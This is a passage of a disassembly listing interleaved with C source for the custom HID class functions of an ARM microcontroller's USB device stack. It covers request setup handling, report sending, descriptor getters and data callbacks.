 8008846:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008848:	683b      	ldr	r3, [r7, #0]
 800884a:	88db      	ldrh	r3, [r3, #6]
 800884c:	2b0f      	cmp	r3, #15
 800884e:	bf28      	it	cs
 8008850:	230f      	movcs	r3, #15
 8008852:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008854:	461a      	mov	r2, r3
 8008856:	6878      	ldr	r0, [r7, #4]
 8008858:	f003 fd1a 	bl	800c290 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 800885c:	e006      	b.n	800886c <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 800885e:	6839      	ldr	r1, [r7, #0]
 8008860:	6878      	ldr	r0, [r7, #4]
 8008862:	f003 fc78 	bl	800c156 <USBD_CtlError>
          ret = USBD_FAIL;
 8008866:	2303      	movs	r3, #3
 8008868:	75fb      	strb	r3, [r7, #23]
          break;
 800886a:	bf00      	nop
      }
      break;
 800886c:	e09a      	b.n	80089a4 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800886e:	683b      	ldr	r3, [r7, #0]
 8008870:	785b      	ldrb	r3, [r3, #1]
 8008872:	2b0b      	cmp	r3, #11
 8008874:	f200 8086 	bhi.w	8008984 <USBD_CUSTOM_HID_Setup+0x204>
 8008878:	a201      	add	r2, pc, #4	; (adr r2, 8008880 <USBD_CUSTOM_HID_Setup+0x100>)
 800887a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800887e:	bf00      	nop
 8008880:	080088b1 	.word	0x080088b1
 8008884:	08008993 	.word	0x08008993
 8008888:	08008985 	.word	0x08008985
 800888c:	08008985 	.word	0x08008985
 8008890:	08008985 	.word	0x08008985
 8008894:	08008985 	.word	0x08008985
 8008898:	080088db 	.word	0x080088db
 800889c:	08008985 	.word	0x08008985
 80088a0:	08008985 	.word	0x08008985
 80088a4:	08008985 	.word	0x08008985
 80088a8:	08008933 	.word	0x08008933
 80088ac:	0800895d 	.word	0x0800895d
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088b0:	687b      	ldr	r3, [r7, #4]
 80088b2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088b6:	b2db      	uxtb	r3, r3
 80088b8:	2b03      	cmp	r3, #3
 80088ba:	d107      	bne.n	80088cc <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80088bc:	f107 030e 	add.w	r3, r7, #14
 80088c0:	2202      	movs	r2, #2
 80088c2:	4619      	mov	r1, r3
 80088c4:	6878      	ldr	r0, [r7, #4]
 80088c6:	f003 fcb7 	bl	800c238 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088ca:	e063      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088cc:	6839      	ldr	r1, [r7, #0]
 80088ce:	6878      	ldr	r0, [r7, #4]
 80088d0:	f003 fc41 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 80088d4:	2303      	movs	r3, #3
 80088d6:	75fb      	strb	r3, [r7, #23]
          break;
 80088d8:	e05c      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 80088da:	683b      	ldr	r3, [r7, #0]
 80088dc:	885b      	ldrh	r3, [r3, #2]
 80088de:	0a1b      	lsrs	r3, r3, #8
 80088e0:	b29b      	uxth	r3, r3
 80088e2:	2b22      	cmp	r3, #34	; 0x22
 80088e4:	d110      	bne.n	8008908 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 80088e6:	683b      	ldr	r3, [r7, #0]
 80088e8:	88db      	ldrh	r3, [r3, #6]
 80088ea:	2b49      	cmp	r3, #73	; 0x49
 80088ec:	bf28      	it	cs
 80088ee:	2349      	movcs	r3, #73	; 0x49
 80088f0:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 80088f2:	687b      	ldr	r3, [r7, #4]
 80088f4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80088f8:	687a      	ldr	r2, [r7, #4]
 80088fa:	33b0      	adds	r3, #176	; 0xb0
 80088fc:	009b      	lsls	r3, r3, #2
 80088fe:	4413      	add	r3, r2
 8008900:	685b      	ldr	r3, [r3, #4]
 8008902:	681b      	ldr	r3, [r3, #0]
 8008904:	61bb      	str	r3, [r7, #24]
 8008906:	e00d      	b.n	8008924 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008908:	683b      	ldr	r3, [r7, #0]
 800890a:	885b      	ldrh	r3, [r3, #2]
 800890c:	0a1b      	lsrs	r3, r3, #8
 800890e:	b29b      	uxth	r3, r3
 8008910:	2b21      	cmp	r3, #33	; 0x21
 8008912:	d107      	bne.n	8008924 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008914:	4b26      	ldr	r3, [pc, #152]	; (80089b0 <USBD_CUSTOM_HID_Setup+0x230>)
 8008916:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008918:	683b      	ldr	r3, [r7, #0]
 800891a:	88db      	ldrh	r3, [r3, #6]
 800891c:	2b09      	cmp	r3, #9
 800891e:	bf28      	it	cs
 8008920:	2309      	movcs	r3, #9
 8008922:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008924:	8bfb      	ldrh	r3, [r7, #30]
 8008926:	461a      	mov	r2, r3
 8008928:	69b9      	ldr	r1, [r7, #24]
 800892a:	6878      	ldr	r0, [r7, #4]
 800892c:	f003 fc84 	bl	800c238 <USBD_CtlSendData>
          break;
 8008930:	e030      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008932:	687b      	ldr	r3, [r7, #4]
 8008934:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008938:	b2db      	uxtb	r3, r3
 800893a:	2b03      	cmp	r3, #3
 800893c:	d107      	bne.n	800894e <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 800893e:	693b      	ldr	r3, [r7, #16]
 8008940:	3318      	adds	r3, #24
 8008942:	2201      	movs	r2, #1
 8008944:	4619      	mov	r1, r3
 8008946:	6878      	ldr	r0, [r7, #4]
 8008948:	f003 fc76 	bl	800c238 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800894c:	e022      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 800894e:	6839      	ldr	r1, [r7, #0]
 8008950:	6878      	ldr	r0, [r7, #4]
 8008952:	f003 fc00 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 8008956:	2303      	movs	r3, #3
 8008958:	75fb      	strb	r3, [r7, #23]
          break;
 800895a:	e01b      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800895c:	687b      	ldr	r3, [r7, #4]
 800895e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008962:	b2db      	uxtb	r3, r3
 8008964:	2b03      	cmp	r3, #3
 8008966:	d106      	bne.n	8008976 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008968:	683b      	ldr	r3, [r7, #0]
 800896a:	885b      	ldrh	r3, [r3, #2]
 800896c:	b2db      	uxtb	r3, r3
 800896e:	461a      	mov	r2, r3
 8008970:	693b      	ldr	r3, [r7, #16]
 8008972:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008974:	e00e      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008976:	6839      	ldr	r1, [r7, #0]
 8008978:	6878      	ldr	r0, [r7, #4]
 800897a:	f003 fbec 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 800897e:	2303      	movs	r3, #3
 8008980:	75fb      	strb	r3, [r7, #23]
          break;
 8008982:	e007      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008984:	6839      	ldr	r1, [r7, #0]
 8008986:	6878      	ldr	r0, [r7, #4]
 8008988:	f003 fbe5 	bl	800c156 <USBD_CtlError>
          ret = USBD_FAIL;
 800898c:	2303      	movs	r3, #3
 800898e:	75fb      	strb	r3, [r7, #23]
          break;
 8008990:	e000      	b.n	8008994 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008992:	bf00      	nop
      }
      break;
 8008994:	e006      	b.n	80089a4 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008996:	6839      	ldr	r1, [r7, #0]
 8008998:	6878      	ldr	r0, [r7, #4]
 800899a:	f003 fbdc 	bl	800c156 <USBD_CtlError>
      ret = USBD_FAIL;
 800899e:	2303      	movs	r3, #3
 80089a0:	75fb      	strb	r3, [r7, #23]
      break;
 80089a2:	bf00      	nop
  }
  return (uint8_t)ret;
 80089a4:	7dfb      	ldrb	r3, [r7, #23]
}
 80089a6:	4618      	mov	r0, r3
 80089a8:	3720      	adds	r7, #32
 80089aa:	46bd      	mov	sp, r7
 80089ac:	bd80      	pop	{r7, pc}
 80089ae:	bf00      	nop
 80089b0:	20000090 	.word	0x20000090

080089b4 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 80089b4:	b580      	push	{r7, lr}
 80089b6:	b086      	sub	sp, #24
 80089b8:	af00      	add	r7, sp, #0
 80089ba:	60f8      	str	r0, [r7, #12]
 80089bc:	60b9      	str	r1, [r7, #8]
 80089be:	4613      	mov	r3, r2
 80089c0:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80089c2:	68fb      	ldr	r3, [r7, #12]
 80089c4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089c8:	68fb      	ldr	r3, [r7, #12]
 80089ca:	32b0      	adds	r2, #176	; 0xb0
 80089cc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089d0:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 80089d2:	697b      	ldr	r3, [r7, #20]
 80089d4:	2b00      	cmp	r3, #0
 80089d6:	d101      	bne.n	80089dc <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 80089d8:	2303      	movs	r3, #3
 80089da:	e019      	b.n	8008a10 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089dc:	68fb      	ldr	r3, [r7, #12]
 80089de:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089e2:	b2db      	uxtb	r3, r3
 80089e4:	2b03      	cmp	r3, #3
 80089e6:	d112      	bne.n	8008a0e <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 80089e8:	697b      	ldr	r3, [r7, #20]
 80089ea:	f893 3020 	ldrb.w	r3, [r3, #32]
 80089ee:	2b00      	cmp	r3, #0
 80089f0:	d10b      	bne.n	8008a0a <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 80089f2:	697b      	ldr	r3, [r7, #20]
 80089f4:	2201      	movs	r2, #1
 80089f6:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 80089fa:	4b07      	ldr	r3, [pc, #28]	; (8008a18 <USBD_CUSTOM_HID_SendReport+0x64>)
 80089fc:	7819      	ldrb	r1, [r3, #0]
 80089fe:	88fb      	ldrh	r3, [r7, #6]
 8008a00:	68ba      	ldr	r2, [r7, #8]
 8008a02:	68f8      	ldr	r0, [r7, #12]
 8008a04:	f004 f9ea 	bl	800cddc <USBD_LL_Transmit>
 8008a08:	e001      	b.n	8008a0e <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a0a:	2301      	movs	r3, #1
 8008a0c:	e000      	b.n	8008a10 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a0e:	2300      	movs	r3, #0
}
 8008a10:	4618      	mov	r0, r3
 8008a12:	3718      	adds	r7, #24
 8008a14:	46bd      	mov	sp, r7
 8008a16:	bd80      	pop	{r7, pc}
 8008a18:	200000a6 	.word	0x200000a6

08008a1c <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008a1c:	b580      	push	{r7, lr}
 8008a1e:	b084      	sub	sp, #16
 8008a20:	af00      	add	r7, sp, #0
 8008a22:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a24:	2181      	movs	r1, #129	; 0x81
 8008a26:	4815      	ldr	r0, [pc, #84]	; (8008a7c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a28:	f002 fd32 	bl	800b490 <USBD_GetEpDesc>
 8008a2c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a2e:	2101      	movs	r1, #1
 8008a30:	4812      	ldr	r0, [pc, #72]	; (8008a7c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a32:	f002 fd2d 	bl	800b490 <USBD_GetEpDesc>
 8008a36:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a38:	68fb      	ldr	r3, [r7, #12]
 8008a3a:	2b00      	cmp	r3, #0
 8008a3c:	d009      	beq.n	8008a52 <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a3e:	68fb      	ldr	r3, [r7, #12]
 8008a40:	2200      	movs	r2, #0
 8008a42:	f042 0202 	orr.w	r2, r2, #2
 8008a46:	711a      	strb	r2, [r3, #4]
 8008a48:	2200      	movs	r2, #0
 8008a4a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a4c:	68fb      	ldr	r3, [r7, #12]
 8008a4e:	2205      	movs	r2, #5
 8008a50:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a52:	68bb      	ldr	r3, [r7, #8]
 8008a54:	2b00      	cmp	r3, #0
 8008a56:	d009      	beq.n	8008a6c <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a58:	68bb      	ldr	r3, [r7, #8]
 8008a5a:	2200      	movs	r2, #0
 8008a5c:	f042 0202 	orr.w	r2, r2, #2
 8008a60:	711a      	strb	r2, [r3, #4]
 8008a62:	2200      	movs	r2, #0
 8008a64:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a66:	68bb      	ldr	r3, [r7, #8]
 8008a68:	2205      	movs	r2, #5
 8008a6a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008a6c:	687b      	ldr	r3, [r7, #4]
 8008a6e:	2229      	movs	r2, #41	; 0x29
 8008a70:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008a72:	4b02      	ldr	r3, [pc, #8]	; (8008a7c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008a74:	4618      	mov	r0, r3
 8008a76:	3710      	adds	r7, #16
 8008a78:	46bd      	mov	sp, r7
 8008a7a:	bd80      	pop	{r7, pc}
 8008a7c:	20000064 	.word	0x20000064

08008a80 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008a80:	b580      	push	{r7, lr}
 8008a82:	b084      	sub	sp, #16
 8008a84:	af00      	add	r7, sp, #0
 8008a86:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a88:	2181      	movs	r1, #129	; 0x81
 8008a8a:	4815      	ldr	r0, [pc, #84]	; (8008ae0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008a8c:	f002 fd00 	bl	800b490 <USBD_GetEpDesc>
 8008a90:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a92:	2101      	movs	r1, #1
 8008a94:	4812      	ldr	r0, [pc, #72]	; (8008ae0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008a96:	f002 fcfb 	bl	800b490 <USBD_GetEpDesc>
 8008a9a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a9c:	68fb      	ldr	r3, [r7, #12]
 8008a9e:	2b00      	cmp	r3, #0
 8008aa0:	d009      	beq.n	8008ab6 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008aa2:	68fb      	ldr	r3, [r7, #12]
 8008aa4:	2200      	movs	r2, #0
 8008aa6:	f042 0202 	orr.w	r2, r2, #2
 8008aaa:	711a      	strb	r2, [r3, #4]
 8008aac:	2200      	movs	r2, #0
 8008aae:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008ab0:	68fb      	ldr	r3, [r7, #12]
 8008ab2:	2205      	movs	r2, #5
 8008ab4:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ab6:	68bb      	ldr	r3, [r7, #8]
 8008ab8:	2b00      	cmp	r3, #0
 8008aba:	d009      	beq.n	8008ad0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008abc:	68bb      	ldr	r3, [r7, #8]
 8008abe:	2200      	movs	r2, #0
 8008ac0:	f042 0202 	orr.w	r2, r2, #2
 8008ac4:	711a      	strb	r2, [r3, #4]
 8008ac6:	2200      	movs	r2, #0
 8008ac8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008aca:	68bb      	ldr	r3, [r7, #8]
 8008acc:	2205      	movs	r2, #5
 8008ace:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008ad0:	687b      	ldr	r3, [r7, #4]
 8008ad2:	2229      	movs	r2, #41	; 0x29
 8008ad4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008ad6:	4b02      	ldr	r3, [pc, #8]	; (8008ae0 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008ad8:	4618      	mov	r0, r3
 8008ada:	3710      	adds	r7, #16
 8008adc:	46bd      	mov	sp, r7
 8008ade:	bd80      	pop	{r7, pc}
 8008ae0:	20000064 	.word	0x20000064

08008ae4 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008ae4:	b580      	push	{r7, lr}
 8008ae6:	b084      	sub	sp, #16
 8008ae8:	af00      	add	r7, sp, #0
 8008aea:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008aec:	2181      	movs	r1, #129	; 0x81
 8008aee:	4815      	ldr	r0, [pc, #84]	; (8008b44 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008af0:	f002 fcce 	bl	800b490 <USBD_GetEpDesc>
 8008af4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008af6:	2101      	movs	r1, #1
 8008af8:	4812      	ldr	r0, [pc, #72]	; (8008b44 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008afa:	f002 fcc9 	bl	800b490 <USBD_GetEpDesc>
 8008afe:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b00:	68fb      	ldr	r3, [r7, #12]
 8008b02:	2b00      	cmp	r3, #0
 8008b04:	d009      	beq.n	8008b1a <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b06:	68fb      	ldr	r3, [r7, #12]
 8008b08:	2200      	movs	r2, #0
 8008b0a:	f042 0202 	orr.w	r2, r2, #2
 8008b0e:	711a      	strb	r2, [r3, #4]
 8008b10:	2200      	movs	r2, #0
 8008b12:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b14:	68fb      	ldr	r3, [r7, #12]
 8008b16:	2205      	movs	r2, #5
 8008b18:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b1a:	68bb      	ldr	r3, [r7, #8]
 8008b1c:	2b00      	cmp	r3, #0
 8008b1e:	d009      	beq.n	8008b34 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b20:	68bb      	ldr	r3, [r7, #8]
 8008b22:	2200      	movs	r2, #0
 8008b24:	f042 0202 	orr.w	r2, r2, #2
 8008b28:	711a      	strb	r2, [r3, #4]
 8008b2a:	2200      	movs	r2, #0
 8008b2c:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b2e:	68bb      	ldr	r3, [r7, #8]
 8008b30:	2205      	movs	r2, #5
 8008b32:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b34:	687b      	ldr	r3, [r7, #4]
 8008b36:	2229      	movs	r2, #41	; 0x29
 8008b38:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b3a:	4b02      	ldr	r3, [pc, #8]	; (8008b44 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008b3c:	4618      	mov	r0, r3
 8008b3e:	3710      	adds	r7, #16
 8008b40:	46bd      	mov	sp, r7
 8008b42:	bd80      	pop	{r7, pc}
 8008b44:	20000064 	.word	0x20000064

08008b48 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b48:	b480      	push	{r7}
 8008b4a:	b083      	sub	sp, #12
 8008b4c:	af00      	add	r7, sp, #0
 8008b4e:	6078      	str	r0, [r7, #4]
 8008b50:	460b      	mov	r3, r1
 8008b52:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008b54:	687b      	ldr	r3, [r7, #4]
 8008b56:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b5a:	687b      	ldr	r3, [r7, #4]
 8008b5c:	32b0      	adds	r2, #176	; 0xb0
 8008b5e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b62:	2200      	movs	r2, #0
 8008b64:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008b68:	2300      	movs	r3, #0
}
 8008b6a:	4618      	mov	r0, r3
 8008b6c:	370c      	adds	r7, #12
 8008b6e:	46bd      	mov	sp, r7
 8008b70:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008b74:	4770      	bx	lr

08008b76 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b76:	b580      	push	{r7, lr}
 8008b78:	b084      	sub	sp, #16
 8008b7a:	af00      	add	r7, sp, #0
 8008b7c:	6078      	str	r0, [r7, #4]
 8008b7e:	460b      	mov	r3, r1
 8008b80:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008b82:	687b      	ldr	r3, [r7, #4]
 8008b84:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b88:	687b      	ldr	r3, [r7, #4]
 8008b8a:	32b0      	adds	r2, #176	; 0xb0
 8008b8c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b90:	2b00      	cmp	r3, #0
 8008b92:	d101      	bne.n	8008b98 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008b94:	2303      	movs	r3, #3
 8008b96:	e017      	b.n	8008bc8 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008b98:	687b      	ldr	r3, [r7, #4]
 8008b9a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b9e:	687b      	ldr	r3, [r7, #4]
 8008ba0:	32b0      	adds	r2, #176	; 0xb0
 8008ba2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ba6:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008ba8:	687b      	ldr	r3, [r7, #4]
 8008baa:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008bae:	687a      	ldr	r2, [r7, #4]
 8008bb0:	33b0      	adds	r3, #176	; 0xb0
 8008bb2:	009b      	lsls	r3, r3, #2
 8008bb4:	4413      	add	r3, r2
 8008bb6:	685b      	ldr	r3, [r3, #4]
 8008bb8:	68db      	ldr	r3, [r3, #12]
 8008bba:	68fa      	ldr	r2, [r7, #12]
 8008bbc:	7810      	ldrb	r0, [r2, #0]
 8008bbe:	68fa      	ldr	r2, [r7, #12]
 8008bc0:	7852      	ldrb	r2, [r2, #1]
 8008bc2:	4611      	mov	r1, r2
 8008bc4:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008bc6:	2300      	movs	r3, #0
}
 8008bc8:	4618      	mov	r0, r3
 8008bca:	3710      	adds	r7, #16
